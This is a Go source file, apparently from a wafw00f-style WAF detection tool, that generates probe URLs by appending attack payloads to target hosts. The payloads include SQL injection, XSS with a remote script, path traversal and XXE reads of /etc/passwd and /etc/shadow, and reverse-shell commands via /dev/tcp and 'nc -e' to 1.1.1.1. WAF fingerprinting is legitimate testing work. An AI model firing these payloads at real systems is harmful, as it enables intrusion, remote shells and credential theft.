package wafw00f

import (
	"bufio"
	"fmt"
	"net/url"
	"os"
	"strings"

	"github.com/ShangRui-hash/go-wafw00f/settings"
	"github.com/sirupsen/logrus"
)

type URLGenerator struct {
	Payloads []string
}

func NewURLGenerator() *URLGenerator {
	var (
		sqlPayloads = []string{
			"?id=1'%20union%20select%1%20from%20information_schema.tables%20--+",
			"?id=1/**/and/**/1=(updatexml(1,concat(0x3a,(database())),1))%23",
			"?id=1%20and/**/if((select%20count(schema_name)+" +
				"from/**/information_schema.schemata)=9,sleep(5),1)--+",
		}
		xssPayloads = []string{
			"?id=1<script>alert('test');</script>",
			"?id=1<scRiPt src='http://xxx/xss.js'></scRiPt>",
			"?id=1<iframe onload=alert('xss')>",
		}
		rcePayloads = []string{
			"?cmd=/bin/cat+/etc/passwd",
			"?cmd=bash+-i+>&+/dev/tcp/1.1.1.1/111+0>&1",
			"?cmd=nc+-v+1.1.1.1+1111+-e+/bin/bash",
		}
		includePayload = "?file=../../../../etc/passwd"
		xxePayload     = "?id=<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><pwn>&hack;</pwn>"
	)
	payloads := append(append(append(sqlPayloads, xssPayloads...), rcePayloads...), includePayload, xxePayload)
	return &URLGenerator{
		Payloads: payloads,
	}
}

//genURL 生产url
func (u *URLGenerator) GenURL(urlCh chan string) error {
	defer close(urlCh)
	total := 0
	if settings.CurrentRunConf.Stdin {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			u.inputURL(urlCh, scanner.Text(), &total)
		}
	}
	if settings.CurrentRunConf.URL != "" {
		u.inputURL(urlCh, settings.CurrentRunConf.URL, &total)
	}
	if total == 0 {
		err := fmt.Errorf("no url to scan,please specify --stdin or -u")
		logrus.Error(err)
		return err
	}
	return nil
}

//inputURL 将url输入到管道中
func (u *URLGenerator) inputURL(urlCh chan string, URL string, total *int) {
	if !strings.HasPrefix(URL, "http://") && !strings.HasPrefix(URL, "https://") {
		u.inputURL(urlCh, "http://"+URL, total)
		u.inputURL(urlCh, "https://"+URL, total)
	} else {
		if URLItem, err := url.Parse(URL); err == nil {
			for i := range u.Payloads {
				urlCh <- URLItem.Scheme + "://" + URLItem.Host + u.Payloads[i]
				(*total)++
			}
		}
	}
}
